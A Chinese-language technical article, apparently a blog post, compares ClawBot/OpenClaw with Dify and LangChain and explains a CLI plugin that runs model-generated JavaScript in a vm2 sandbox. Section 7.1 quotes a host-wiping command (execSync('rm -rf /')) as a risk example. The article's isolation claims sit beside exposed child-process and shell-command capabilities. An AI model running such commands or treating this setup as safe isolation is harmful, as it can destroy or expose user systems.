<table><thead><tr><th>层次</th><th>作用</th><th>与「AI 集成应用」的关系</th></tr></thead><tbody><tr><td><strong>模型层</strong></td><td>提供推理与生成能力</td><td>应用通过 API 调用模型，得到回复或决策</td></tr><tr><td><strong>记忆层</strong></td><td>存储与检索知识、对话历史、用户偏好</td><td>应用把「要记住什么」「要查什么」交给记忆层，再拼进上下文</td></tr><tr><td><strong>编排层</strong></td><td>决定调用顺序、分支、工具选择</td><td>应用要么使用现成编排工具（如 Dify、LangChain），要么<strong>自研编排逻辑</strong>（如 ClawBot）</td></tr><tr><td><strong>应用层</strong></td><td>面向最终用户的产品形态</td><td><strong>AI 集成应用就站在这一层</strong>，整合下层能力，并通过 IM、Web、API 等渠道交付给用户</td></tr></tbody></table>
<p>因此：<strong>AI 集成应用 = 在应用层，对模型层、记忆层、编排层（及工具）做整合后的可交付产品</strong>。ClawBot / OpenClaw 正是这一类产品——它们<strong>没有直接采用前文提到的 Dify 或 LangChain</strong>，而是<strong>自研了编排与技能体系</strong>，从而更贴合「个人助理 + 多渠道 + 本地优先」的定位。</p>
<h4 data-id="heading-22">6.2 ClawBot / OpenClaw 简介</h4>
<p><strong>ClawBot</strong>（后曾用名 Moltbot，开源版本常称 <strong>OpenClaw</strong>）是一类<strong>个人 AI 助手</strong>型集成应用，典型特点包括：</p>
<ul>
<li><strong>可执行实际操作</strong>：不限于聊天，能运行命令、填表格、发邮件、控制浏览器与智能家居等，充当「数字个人助理」。</li>
<li><strong>多渠道集成</strong>：接入 WhatsApp、Telegram、iMessage、Slack、Discord 等，在用户日常使用的通讯工具里与用户交互，实现「像和真人对话一样」的使用方式。</li>
<li><strong>对话记忆</strong>：能记住较长时间的对话内容，并支持主动提醒等能力，依赖自研或集成的记忆机制。</li>
<li><strong>技能系统</strong>：通过 <strong>AgentSkills 兼容的技能</strong>（或类似插件）扩展能力，用户可从 <strong>ClawdHub</strong> 等技能库发现、安装、更新技能，形成可扩展生态。</li>
</ul>
<p>这类产品把「模型 + 记忆 + 编排 + 工具」全部收口在一个应用里，用户看到的是「一个助理」，背后则是模型层、记忆层、编排层的协同。</p>
<h4 data-id="heading-23">6.3 与模型层、记忆层、编排层的关系</h4>
<p>ClawBot / OpenClaw 作为<strong>应用层</strong>产品，与各层的关系可以概括为：</p>
<ul>
<li><strong>模型层</strong>：通过接入 OpenAI、Claude、DeepSeek 等厂商的 API，获得推理与生成能力；应用负责组请求、解析回复。</li>
<li><strong>记忆层</strong>：采用自研记忆方案（例如用 <strong>Markdown 文本文件</strong> 存储 AGENTS.md、SOUL.md、MEMORY.md、每日记忆日志等），实现长期记忆与人格/行为设定；部分能力在概念上与 RAG/向量库类似，但实现方式更轻量、本地化。</li>
<li><strong>编排层</strong>：<strong>并未使用 Dify、LangChain 等现成编排平台</strong>，而是<strong>自研编排与调度</strong>——例如通过 <strong>Gateway 控制平面</strong>统一管理消息通道、工具调用与事件触发，相当于「自建了一个小型编排引擎」，以便深度贴合 IM 接入、设备控制、技能加载等需求。</li>
</ul>
<p>也就是说：<strong>他们站在应用层，自己实现了「何时调模型、何时查记忆、何时调哪个技能/工具」的逻辑</strong>，从而在架构上与「用 Dify 画布」或「用 LangChain 写链」形成差异：更垂直、更产品化，而不是通用编排平台。</p>
<h4 data-id="heading-24">6.4 他们做了什么创新</h4>
<p>从公开资料与社区讨论中，可以归纳出以下几类创新点：</p>





























<table><thead><tr><th>方向</th><th>说明</th></tr></thead><tbody><tr><td><strong>插件化 / 技能生态</strong></td><td>从单体演进为<strong>插件化架构</strong>，模型提供商、技能等解耦为独立模块；通过 <strong>ClawdHub</strong> 等技能注册表，用户可发现、安装、更新技能，社区可贡献新能力，形成「应用 + 技能市场」的形态。</td></tr><tr><td><strong>Gateway 控制平面</strong></td><td>消息通道、工具调用、事件触发由<strong>统一 Gateway</strong> 管理，类似「总控/接线员」，便于对接多种 IM 与设备，并统一做鉴权、限流、路由。</td></tr><tr><td><strong>本地优先与记忆形态</strong></td><td><strong>本地优先</strong>策略，敏感数据可只存本地；记忆采用 <strong>Markdown 文件</strong>（如 AGENTS.md、MEMORY.md、每日日志），用户和开发者可直接查看、编辑，透明且可版本管理。</td></tr><tr><td><strong>多渠道 + 7×24 待命</strong></td><td>深度集成 IM，用户在常用聊天工具里即可与 AI 交互；结合自动化与记忆，实现「随时发消息、随时执行任务」的助理体验。</td></tr><tr><td><strong>自动化执行深度</strong></td><td>不限于「聊天 + 查知识」，而是真正执行操作：填表、发邮件、跑脚本、控制浏览器与智能家居等，把「工具调用」做成产品级能力。</td></tr></tbody></table>
<p>这些创新集中在<strong>应用形态、编排自研、记忆形态、技能生态、渠道与执行深度</strong>上，与「只接一个模型 API」或「只用通用编排平台」的路线有明显区别。</p>
<h4 data-id="heading-25">6.5 自研框架与流行框架的异同</h4>








































<table><thead><tr><th>维度</th><th>ClawBot / OpenClaw 自研路线</th><th>Dify / LangChain 等流行框架</th></tr></thead><tbody><tr><td><strong>编排</strong></td><td><strong>自研</strong>：Gateway + 自建调度逻辑，不依赖 Dify/LangChain</td><td><strong>通用编排</strong>：Dify 画布、LangChain 链/Agent，可复用于多种应用</td></tr><tr><td><strong>定位</strong></td><td><strong>应用层产品</strong>：直接面向终端用户（个人助理、IM 内使用）</td><td><strong>能力层/中间层</strong>：提供编排与集成能力，由业务再封装成应用</td></tr><tr><td><strong>记忆</strong></td><td><strong>自研</strong>：Markdown 文件、本地优先，强调可控与可读</td><td><strong>通用方案</strong>：多与向量库/RAG 集成，Dify/LangChain 均支持多种记忆与检索</td></tr><tr><td><strong>扩展</strong></td><td><strong>技能/插件</strong>：ClawdHub、AgentSkills 兼容技能，围绕「一个应用」扩展</td><td><strong>Tool/插件/工作流</strong>：Dify 插件与工作流节点、LangChain Tool，围绕「编排能力」扩展</td></tr><tr><td><strong>渠道与部署</strong></td><td><strong>深度集成 IM</strong>、本地优先、设备控制等，产品形态固定</td><td><strong>渠道无关</strong>：多为 API/SDK，由接入方决定 Web/IM/内部系统等</td></tr><tr><td><strong>底层逻辑</strong></td><td><strong>相同</strong>：仍是「模型 + 记忆 + 工具调用」的认知架构，只是编排与记忆的实现方式自研</td><td><strong>相同</strong>：同样依赖模型 API、记忆/检索、工具调用，只是以通用框架形式提供</td></tr></tbody></table>
<p><strong>小结</strong>：ClawBot / OpenClaw 是<strong>应用层的 AI 集成应用</strong>，在模型层、记忆层、编排层之上做整合；<strong>创新点</strong>在于自研编排与技能体系、Gateway 控制平面、本地优先的记忆形态、以及多渠道 IM 与深度自动化执行；<strong>与 Dify/LangChain 的异同</strong>——底层思想一致（模型+记忆+工具），但<strong>不自建在现成编排平台上</strong>，而是<strong>自研框架</strong>以更好贴合「个人助理 + 多渠道 + 本地 + 技能生态」的产品目标。</p>
<hr/>
<h3 data-id="heading-26">七、沙箱插件功能实现</h3>
<p>本节介绍 CLI 中「AI 沙箱」插件的功能与实现思路，便于对内分享。实现基于 <strong>LangChain</strong> 的 <strong>Tool</strong> 与 <strong>Agent 调用</strong>（<a href="https://link.juejin.cn?target=https%3A%2F%2Fjs.langchain.com%2Fdocs%2Fconcepts%2Ftools%2F" target="_blank" title="https://js.langchain.com/docs/concepts/tools/" ref="nofollow noopener noreferrer">LangChain Tools 概念</a>），用自然语言驱动「生成代码 → 沙箱执行」的闭环。</p>
<h4 data-id="heading-27">7.1 沙箱的概念：为什么需要沙箱</h4>
<p><strong>沙箱（Sandbox）</strong> 在这里指：在一个<strong>隔离的运行时环境</strong>里执行<strong>由 AI 生成的代码</strong>，而不是直接在宿主进程里执行。</p>
<ul>
<li><strong>为什么要隔离</strong>：用户说「生成一个 index.html」或「把当前目录下所有 .txt 里的空格改成下划线」时，我们会让模型<strong>生成一段 JavaScript 代码</strong>，再由程序执行。若这段代码直接在宿主 Node 进程里跑，一旦模型生成 <code>require('child_process').execSync('rm -rf /')</code> 或访问敏感环境变量，就会对真实系统造成风险。沙箱的作用是<strong>限制执行环境</strong>：只暴露我们允许的 API（如 <code>createFile</code>、<code>readFile</code>、<code>listDir</code>），不暴露完整的 <code>require</code>、<code>process.env</code> 等，从而把「AI 生成的代码」和「真实系统」隔开。</li>
<li><strong>本项目的沙箱实现</strong>：使用 <strong>vm2</strong> 库，把一段「沙箱全局对象」（包含 <code>__workspace</code>、<code>fs</code>、<code>path</code>、<code>createFile</code>、<code>readFile</code> 等）注入到 VM 里，模型生成的代码只能访问这些对象；执行时用 <strong>IIFE</strong> 包裹代码以便支持顶层 <code>return</code>，执行结果或异常由宿主捕获后返回给用户。这样既能让 AI「写代码办事」，又不会越权操作宿主。</li>
</ul>
<h4 data-id="heading-28">7.2 功能概述</h4>
<ul>
<li><strong>入口</strong>：<code>st sandbox &lt;指令...&gt;</code>，例如 <code>st sandbox 生成一个 index.html</code>、<code>st sandbox 把当前目录下所有 .txt 里的空格改成下划线</code>。</li>
<li><strong>行为</strong>：根据用户指令，由<strong>调度模型</strong>决定是「执行代码/操作文件」还是「纯问答」；若需执行代码，则再调用一次模型，根据<strong>沙箱环境说明</strong>生成可在沙箱中运行的 JavaScript 代码，经<strong>语法校验</strong>后在 <strong>vm2</strong> 沙箱中执行，并将结果返回给用户。</li>
<li><strong>特殊处理</strong>：若生成的代码会启动 HTTP 服务（如 <code>app.listen</code>），进程会挂起并提示「按 Ctrl+C 停止」，避免服务立刻退出。</li>
</ul>
<h4 data-id="heading-29">7.3 整体流程与 LangChain 概念对应</h4>

























<table><thead><tr><th>步骤</th><th>实现</th><th>LangChain 概念简述</th></tr></thead><tbody><tr><td>1. 调度</td><td>模型根据用户输入决定调用 <code>sandbox</code> 还是 <code>direct_answer</code></td><td><strong>Tool</strong>：把能力封装成工具，模型通过 <strong>tool_calls</strong> 选择调用；<a href="https://link.juejin.cn?target=https%3A%2F%2Fjs.langchain.com%2Fdocs%2Fconcepts%2Ftools%2F%23binding-tools-to-models" target="_blank" title="https://js.langchain.com/docs/concepts/tools/#binding-tools-to-models" ref="nofollow noopener noreferrer">bindTools</a> 将工具绑定到模型。</td></tr><tr><td>2. 生成代码</td><td>沙箱工具内再调用一次模型，传入「沙箱环境说明」+ 用户指令，得到代码字符串</td><td><strong>SystemMessage / HumanMessage</strong>：构造对话；<strong>model.invoke(messages)</strong>：同步调用模型。</td></tr><tr><td>3. 执行与回传</td><td>在 vm2 中执行代码，将 stdout/返回值拼成字符串，作为<strong>ToolMessage</strong> 回传给模型</td><td><strong>ToolMessage</strong>：工具执行结果必须用 <code>tool_call_id</code> 与之前的 <strong>tool_calls</strong> 对应，模型据此继续推理或结束。</td></tr></tbody></table>
<p>多轮逻辑：命令里用 <code>messages</code> 数组累积 <strong>HumanMessage → AIMessage（含 tool_calls）→ ToolMessage → …</strong>，循环 <code>model.invoke(messages)</code> 直到模型不再发起 tool_calls，即完成一轮「调度 → 执行 → 回复」。</p>
<h4 data-id="heading-30">7.4 命令入口：调度 Agent 与工具循环</h4>
<p>命令定义在 <code>src/bin/command/agentCommand/sandbox.ts</code>。核心：<strong>绑定两个 Tool</strong>，用<strong>系统提示词</strong>约束「何时调沙箱、何时直接回答」。</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 调度提示：需要动文件/跑代码 → sandbox；纯问答 → direct_answer</span>
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">DISPATCHER_SYSTEM_PROMPT</span> = <span class="hljs-string">`你是调度助手：根据用户输入决定「要不要执行代码」，并只调用一个工具。
规则：
1. **需要执行代码/操作文件时** → 调用 \`sandbox\`，把用户的整句指令原样传入。
2. **纯问答、不需要动文件或跑代码时** → 调用 \`direct_answer\`，用 \`answer\` 参数给出简短回答（1～3 句话）。
3. 只调用一个工具，不要同时调用两个。`</span>;

<span class="hljs-keyword">const</span> tools = [sandboxTool, answerTool];
<span class="hljs-keyword">const</span> model = <span class="hljs-title function_">createModel</span>().<span class="hljs-title function_">bindTools</span>(tools);
<span class="hljs-keyword">const</span> messages = [<span class="hljs-keyword">new</span> <span class="hljs-title class_">SystemMessage</span>(<span class="hljs-variable constant_">DISPATCHER_SYSTEM_PROMPT</span>), <span class="hljs-keyword">new</span> <span class="hljs-title class_">HumanMessage</span>(instruction)];
<span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> model.<span class="hljs-title function_">invoke</span>(messages);
<span class="hljs-comment">// 若有 response.tool_calls，则执行对应工具，把结果 push 成 ToolMessage，再 invoke(messages)，循环</span>
</code></pre>
<ul>
<li><strong>bindTools(tools)</strong>：LangChain 中把「可调用的工具列表」绑到模型上，模型输出中会包含 <strong>tool_calls</strong>（工具名 + 参数）。</li>
<li><strong>ToolMessage</strong>：构造时需传入 <strong>tool_call_id</strong>（与 AIMessage 中某条 tool_call 的 id 一致），这样模型才能把「这条工具结果」与「哪一次调用」对应起来。</li>
</ul>
<h4 data-id="heading-31">7.5 Tools 如何写、为什么这么写</h4>
<p>工具定义在 <code>src/bin/langchain/tools/sandbox.ts</code>。我们只暴露<strong>两个 Tool</strong>：<code>direct_answer</code>（纯问答）和 <code>sandbox</code>（执行代码/操作文件）。模型通过 <strong>tool_calls</strong> 选择调用哪一个，并传入对应参数。下面用实际代码说明<strong>怎么写</strong>以及<strong>为什么这么写</strong>。</p>
<h5 data-id="heading-32">7.5.1 为什么只有两个 Tool？</h5>
<p>调度层只需要做<strong>二选一</strong>：「用户是在问问题」→ 用 <code>direct_answer</code> 直接回答；「用户要动文件或跑代码」→ 用 <code>sandbox</code> 生成代码并在沙箱里执行。若只给一个「万能工具」，模型容易在纯问答时也去调沙箱，增加延迟和误执行风险；若拆成很多小工具（如「创建文件」「读文件」「执行命令」），调度模型要做的选择太多，容易选错。因此<strong>两个工具、职责清晰</strong>，便于在系统提示词里写清「何时调哪个」。</p>
<h5 data-id="heading-33">7.5.2 answerTool：纯问答工具</h5>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { tool } <span class="hljs-keyword">from</span> <span class="hljs-string">"@langchain/core/tools"</span>;
<span class="hljs-keyword">import</span> { z } <span class="hljs-keyword">from</span> <span class="hljs-string">"zod"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> answerTool = <span class="hljs-title function_">tool</span>(
  <span class="hljs-function">(<span class="hljs-params">args: { answer: <span class="hljs-built_in">string</span> }</span>) =&gt;</span> args.<span class="hljs-property">answer</span>,
  {
    <span class="hljs-attr">name</span>: <span class="hljs-string">"direct_answer"</span>,
    <span class="hljs-attr">description</span>:
      <span class="hljs-string">"仅用于纯问答：用户只是提问、解释、闲聊，不需要创建/修改/删除文件或执行任何代码时使用。回答必须简短（一两句话到一小段），不要长篇大论。"</span>,
    <span class="hljs-attr">schema</span>: z.<span class="hljs-title function_">object</span>({
      <span class="hljs-attr">answer</span>: z.<span class="hljs-title function_">string</span>().<span class="hljs-title function_">describe</span>(<span class="hljs-string">"简短回答，控制在 1～3 句话内，不要过长"</span>),
    }),
  }
);
</code></pre>
<ul>
<li><strong>name</strong>：模型在 <strong>tool_calls</strong> 里通过这个名字选中该工具；写成 <code>direct_answer</code> 与调度提示词里的「调用 <code>direct_answer</code>」一致。</li>
<li><strong>description</strong>：<strong>最关键</strong>。LangChain 会把 description 发给模型，模型据此判断「当前用户输入是否属于纯问答」。这里明确写了「仅用于纯问答」「不需要创建/修改/删除文件或执行任何代码」「回答必须简短」，模型才会在用户问「什么是 RAG」时调这个工具，而不是调 sandbox。</li>
<li><strong>schema</strong>：用 <strong>zod</strong> 声明参数。模型不会「自己发明」参数名，而是按 schema 里的字段生成 JSON；这里只有 <code>answer</code> 一个字符串，模型就会把要回复给用户的话放进 <code>answer</code>，我们直接 <code>args.answer</code> 返回即可。<strong>不写 schema 的话，模型不知道要传什么参数</strong>，容易不传或传错。</li>
</ul>
<h5 data-id="heading-34">7.5.3 sandboxTool：沙箱执行工具</h5>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> sandboxTool = <span class="hljs-title function_">tool</span>(
  <span class="hljs-keyword">async</span> (<span class="hljs-attr">args</span>: { <span class="hljs-attr">instruction</span>: <span class="hljs-built_in">string</span> }) =&gt; {
    <span class="hljs-keyword">const</span> { instruction } = args;
    <span class="hljs-comment">// 1. 构造沙箱专用对话，让模型生成代码</span>
    <span class="hljs-keyword">const</span> messages = [
      <span class="hljs-keyword">new</span> <span class="hljs-title class_">SystemMessage</span>(<span class="hljs-variable constant_">SANDBOX_SYSTEM_PROMPT</span>),
      <span class="hljs-keyword">new</span> <span class="hljs-title class_">HumanMessage</span>(instruction),
    ];
    <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> model.<span class="hljs-title function_">invoke</span>(messages);
    <span class="hljs-keyword">const</span> responseText = <span class="hljs-keyword">typeof</span> res.<span class="hljs-property">content</span> === <span class="hljs-string">"string"</span> ? res.<span class="hljs-property">content</span> : <span class="hljs-title class_">String</span>(res.<span class="hljs-property">content</span> ?? <span class="hljs-string">""</span>);
    <span class="hljs-comment">// 2. 解析代码 + 是否 HTTP 服务</span>
    <span class="hljs-keyword">const</span> { code, isHttpService } = <span class="hljs-title function_">parseCodeFromResponse</span>(responseText);
    <span class="hljs-keyword">if</span> (!code) <span class="hljs-keyword">return</span> <span class="hljs-string">`未能从模型回复中解析出代码。...`</span>;
    <span class="hljs-comment">// 3. Acorn 语法校验</span>
    <span class="hljs-keyword">const</span> validation = <span class="hljs-title function_">validateSyntax</span>(code);
    <span class="hljs-keyword">if</span> (!validation.<span class="hljs-property">ok</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">`语法校验失败：<span class="hljs-subst">${validation.message}</span>`</span>;
    <span class="hljs-comment">// 4. 在沙箱中执行</span>
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">runInSandbox</span>(code);
      <span class="hljs-comment">// 格式化结果，若为 HTTP 服务则加前缀供命令层挂起进程</span>
      <span class="hljs-keyword">return</span> isHttpService ? <span class="hljs-variable constant_">SANDBOX_HTTP_SERVICE_PREFIX</span> + body : body;
    } <span class="hljs-keyword">catch</span> (err) {
      <span class="hljs-keyword">return</span> <span class="hljs-string">`沙箱执行错误：<span class="hljs-subst">${msg}</span>`</span>;
    }
  },
  {
    <span class="hljs-attr">name</span>: <span class="hljs-string">"sandbox"</span>,
    <span class="hljs-attr">description</span>:
      <span class="hljs-string">"仅当用户需要「执行代码/操作文件」时使用：例如创建/修改/删除文件、生成 HTML、批量重命名、运行 shell 命令、读目录等。不需要动文件或跑代码时不要调用。"</span>,
    <span class="hljs-attr">schema</span>: z.<span class="hljs-title function_">object</span>({
      <span class="hljs-attr">instruction</span>: z
        .<span class="hljs-title function_">string</span>()
        .<span class="hljs-title function_">describe</span>(<span class="hljs-string">"用户的自然语言指令，例如：生成一个 index.html；或：把当前目录下所有 .txt 文件名里的空格改成下划线"</span>),
    }),
  }
);
</code></pre>
<ul>
<li><strong>name</strong>：<code>sandbox</code>，与调度提示词里「调用 <code>sandbox</code>」一致。</li>
<li><strong>description</strong>：明确写「仅当用户需要执行代码/操作文件时使用」，并举例（创建/修改/删除文件、生成 HTML、批量重命名、运行命令、读目录），最后强调「不需要动文件或跑代码时不要调用」。这样模型才会在用户说「生成一个 index.html」时调 sandbox，在用户说「什么是 RAG」时不调。</li>
<li><strong>schema</strong>：只有一个参数 <code>instruction</code>，类型为 string，describe 里给了示例。调度模型会把<strong>用户的整句指令</strong>原样放进 <code>instruction</code>，sandboxTool 内部再拿这句 instruction 去调<strong>第二次模型</strong>（生成代码的那次），这样「调度」和「生成代码」解耦：调度只负责选工具+传参，生成代码由沙箱专用的 system prompt（SANDBOX_SYSTEM_PROMPT）约束。</li>
<li><strong>为什么工具内部再调一次模型？</strong> 因为「生成可在沙箱中执行的 JavaScript」需要<strong>另一套提示词</strong>（沙箱环境说明、默认目录、HTTP 服务标记等），和「调度：选 sandbox 还是 direct_answer」的提示词不同。所以设计成：调度模型只做二选一并传 <code>instruction</code>；sandboxTool 内部用 SANDBOX_SYSTEM_PROMPT + instruction 再 invoke 一次模型，得到代码后再校验、执行、返回。这样职责清晰，也便于单独调优沙箱侧的提示词。</li>
</ul>
<h5 data-id="heading-35">7.5.4 sandboxTool 内部四步（简要）</h5>
<ol>
<li><strong>构造沙箱专用对话</strong>：<code>SystemMessage(SANDBOX_SYSTEM_PROMPT)</code> + <code>HumanMessage(instruction)</code>。SANDBOX_SYSTEM_PROMPT 由 <code>getSandboxPromptContext("markdown")</code> 生成，限制模型只使用沙箱内列出的 API。</li>
<li><strong>解析模型回复</strong>：从回复中提取 ```js ... ``` 或裸代码，并判断是否包含 <code>__IS_HTTP_SERVICE__</code> 或代码中是否有 <code>.listen(</code>，用于后续是否挂起进程。</li>
<li><strong>Acorn 语法校验</strong>：在进入 vm2 前用 acorn 做一次 parse，避免明显语法错误在沙箱里报错不明确或卡死。</li>
<li><strong>runInSandbox(code)</strong>：调用沙箱模块执行代码；若为 HTTP 服务，在返回内容前加上 <code>SANDBOX_HTTP_SERVICE_PREFIX</code>，命令层检测到后挂起进程。</li>
</ol>
<h4 data-id="heading-36">7.6 沙箱相关提示词：为什么要这么写</h4>
<p>沙箱功能里用到<strong>两套提示词</strong>：一套在<strong>命令层</strong>做调度（选 sandbox 还是 direct_answer），一套在<strong>沙箱工具内部</strong>做代码生成（只生成可在沙箱中执行的 JavaScript）。两套职责分离，便于单独调优。下面分别贴出关键内容，并说明<strong>为什么要这么写</strong>。对应代码位置：<code>src/bin/command/agentCommand/sandbox.ts</code>（调度）、<code>src/bin/langchain/sandbox/prompt.ts</code>（沙箱环境说明）、<code>src/bin/langchain/tools/sandbox.ts</code>（代码生成规则拼接）。</p>
<hr/>
<h5 data-id="heading-37">7.6.1 调度提示词（DISPATCHER_SYSTEM_PROMPT）</h5>
<p><strong>完整内容</strong>（<code>sandbox.ts</code> 命令入口）：</p>
<pre><code class="hljs language-text" lang="text">你是调度助手：根据用户输入决定「要不要执行代码」，并只调用一个工具。

规则：
1. **需要执行代码/操作文件时** → 调用 `sandbox`，把用户的整句指令原样传入。例如：创建/修改/删除文件、生成 HTML、批量重命名、列目录、运行命令等。
2. **纯问答、不需要动文件或跑代码时** → 调用 `direct_answer`，用 `answer` 参数给出简短回答（1～3 句话，不要长篇大论）。
3. 只调用一个工具，不要同时调用两个。不要输出过长文本。
</code></pre>
<p><strong>为什么要这么写</strong>：</p>



































<table><thead><tr><th>部分</th><th>作用</th><th>不这么写的后果</th></tr></thead><tbody><tr><td><strong>角色</strong>「你是调度助手」</td><td>让模型只做「二选一」决策，不越权去解释或生成代码</td><td>模型可能既调工具又自己啰嗦一大段，或去「猜」用户意图时输出长文</td></tr><tr><td><strong>任务</strong>「根据用户输入决定要不要执行代码，并只调用一个工具」</td><td>明确输出形态：只产生一次 tool_calls，且只选一个工具</td><td>可能同时调 sandbox 和 direct_answer，下游难以处理；或多次调用增加延迟</td></tr><tr><td><strong>规则 1</strong>「需要执行代码/操作文件时 → 调用 sandbox，整句指令原样传入」</td><td>与 Tool 的 <code>name: "sandbox"</code> 一致；举例（创建/修改/删除文件、生成 HTML、批量重命名等）帮助模型判断「何时算需要动文件」</td><td>模型容易在纯问答时也调 sandbox，或把指令改写成自己的话导致语义漂移</td></tr><tr><td><strong>规则 2</strong>「纯问答时 → 调用 direct_answer，answer 参数 1～3 句话」</td><td>与 Tool 的 <code>name: "direct_answer"</code> 和 schema 里的 <code>answer</code> 一致；约束长度便于终端展示</td><td>纯问答时模型可能调 sandbox 或输出过长，影响体验和 token</td></tr><tr><td><strong>规则 3</strong>「只调用一个工具，不要输出过长文本」</td><td>强化「只选一个」和「不附带长文」，避免模型在 tool_calls 之外再输出大段说明</td><td>容易出现「调了工具又输出好几段话」或一次多个 tool_calls</td></tr></tbody></table>
<p>总结：调度提示词的核心是<strong>角色单一（调度）、任务清晰（二选一）、规则与 Tool 的 name/schema 一一对应</strong>，这样模型才会稳定地「只选一个工具、传对参数」。</p>
<hr/>
<h5 data-id="heading-38">7.6.2 沙箱环境说明（prompt.ts：SANDBOX_SCHEMA / getSandboxPromptMarkdown）</h5>
<p><strong>作用</strong>：在沙箱工具内部，把「沙箱里有哪些全局对象/函数、怎么用」写成 Markdown（或 JSON），通过 <code>getSandboxPromptContext("markdown")</code> 拼进 <strong>SANDBOX_SYSTEM_PROMPT</strong> 的前半部分，让生成代码的那次模型<strong>只使用这些 API</strong>，不写 <code>require('fs')</code>、<code>require('path')</code> 等（沙箱里没有原生 require）。</p>
<p><strong>为什么要这么写</strong>：</p>
<ul>
<li><strong>按类别分块</strong>（Node 内置、异步、Web 框架、子进程、便捷 API）：模型按「要找什么能力」快速定位，减少幻觉（例如去用未暴露的 API）。</li>
<li><strong>写清默认操作目录</strong>「默认使用当前命令行所在目录（即 __workspace）；路径用相对路径」：避免模型生成绝对路径或假设别的 cwd，导致执行时报「文件不存在」。</li>
<li><strong>便捷 API 用表格列出</strong>（createFile、readFile、listDir、rename、remove 等）：表格比大段文字更利于模型「按名选用」，且与 <code>common.ts</code> 里真实暴露的函数一致；对易错点（如「改文件名时用 rename，不要只 createFile 新路径」）单独写一句，减少同一内容两份文件。</li>
<li><strong>启动服务、修改文件名等单独强调</strong>：因为模型常犯「只生成文件不 listen」或「只 createFile 新路径不删旧文件」的错，所以在环境说明里就约束好，比只在后面「要求」里写更醒目。</li>
</ul>
<p>对应代码：<code>src/bin/langchain/sandbox/prompt.ts</code> 中的 <strong>SANDBOX_SCHEMA</strong>（JSON 化配置）、<strong>getSandboxPromptMarkdown()</strong>（生成给模型看的 Markdown）；工具里用 <strong>getSandboxPromptContext("markdown")</strong> 取这段，再拼上下面的「要求」部分。</p>
<hr/>
<h5 data-id="heading-39">7.6.3 沙箱代码生成规则（SANDBOX_SYSTEM_PROMPT 后半部分）</h5>
<p>在「沙箱环境说明」之后，工具里拼接的<strong>要求</strong>（<code>src/bin/langchain/tools/sandbox.ts</code> 中的 SANDBOX_SYSTEM_PROMPT）如下，并说明<strong>每条为什么要这么写</strong>：</p>
<pre><code class="hljs language-text" lang="text">---
请根据用户的自然语言指令，生成一段可在上述沙箱中执行的 JavaScript 代码。
要求：
1. 只输出代码，不要解释或 markdown 标题。
2. 代码中只能使用上文列出的全局对象和函数。
3. 若需要返回结果给用户，请用 return 或 console.log。
4. 可以包在 ```js ... ``` 里，也可以直接输出裸代码。
5. 如果你认为执行后有重大错误请直接返回 "执行失败"。
6. **默认操作目录**：如果用户没有指定在哪个目录操作，默认使用当前命令行所在目录（即 __workspace）；路径用相对路径如 '.' 或 '文件名' 即可。
7. **启动服务型项目时**：尽量在沙箱内完成，单段代码中完成应用创建、路由、app.listen 等，不要只生成文件让用户自己运行或依赖沙箱外的步骤；用 app.listen(port, () =&gt; console.log('http://localhost:' + port)) 打印地址，代码末尾不要 return。
8. **若本次生成的代码会启动 HTTP 服务**（如 Koa/Express 的 app.listen），请在代码块后单独一行写 __IS_HTTP_SERVICE__，以便宿主进程挂起（用户 Ctrl+C 停止）。
9. **修改文件名或格式时**：用 rename(oldPath, newPath) 重命名，或先 readFile 再 createFile 新路径后 remove 原文件；不要只 createFile 新路径而保留原文件，避免同一内容有两份。
</code></pre>
<p><strong>为什么要这么写</strong>：</p>























































<table><thead><tr><th>条</th><th>目的</th><th>不这么写的后果</th></tr></thead><tbody><tr><td><strong>1</strong> 只输出代码，不要解释或 markdown 标题</td><td>便于从回复里稳定解析出「一段代码」；解析逻辑依赖「要么 ```js 块要么裸代码」</td><td>模型输出大段说明 + 代码，解析容易取错或取到解释文本</td></tr><tr><td><strong>2</strong> 只能使用上文列出的全局对象和函数</td><td>与 prompt 前半部分「沙箱环境说明」一致，防止用 <code>require('fs')</code> 等沙箱内不存在的东西</td><td>生成的代码在 vm2 里报 <code>require is not defined</code> 或访问未暴露 API 报错</td></tr><tr><td><strong>3</strong> 返回结果用 return 或 console.log</td><td>宿主通过 IIFE 的返回值或 stdout 拿结果；明确两种出口，模型不会只写中间变量不输出</td><td>用户看不到执行结果，或解析不到返回值</td></tr><tr><td><strong>4</strong> 可以包在 ```js 里也可以裸代码</td><td>解析时两种都支持（parseCodeFromResponse），给模型容错空间</td><td>若强制只接受一种，模型有时会选另一种导致解析失败</td></tr><tr><td><strong>5</strong> 认为有重大错误时直接返回 "执行失败"</td><td>避免模型硬生成明显会报错的代码，让工具层直接返回可读提示</td><td>容易得到一段必然报错的代码，用户体验差</td></tr><tr><td><strong>6</strong> 默认操作目录 __workspace，路径用相对路径</td><td>与 prompt 前半部分一致；和 common.ts 里 createSandbox 的 root 对齐</td><td>模型生成 /tmp/xxx 或其它绝对路径，在沙箱里路径不对</td></tr><tr><td><strong>7</strong> 启动服务时在沙箱内完成 listen，不要只生成文件</td><td>用户说「起一个 Koa 服务」时期望直接能访问，而不是再手动运行</td><td>只生成 app.js 让用户自己 node app.js，不符合「一条指令完成」的预期</td></tr><tr><td><strong>8</strong> HTTP 服务时在代码块后写 <strong>IS_HTTP_SERVICE</strong></td><td>工具和命令层用该标记判断是否挂起进程（不退出），否则服务会立刻退出</td><td>启动的服务一启动就退出，用户无法访问</td></tr><tr><td><strong>9</strong> 改文件名用 rename 或 读→写新→删旧</td><td>与环境说明里「不要只 createFile 新路径」一致，避免同一内容两份文件</td><td>用户说「把 a.txt 改成 b.txt」时生成两个文件，语义错误</td></tr></tbody></table>
<p>总结：前半部分（prompt.ts）负责<strong>能力边界与用法约定</strong>，后半部分（工具里拼接）负责<strong>输出格式、默认目录、HTTP 服务、重命名等易错约束</strong>；两段合在一起，模型才能稳定生成「可解析、可执行、行为符合预期」的沙箱代码。</p>
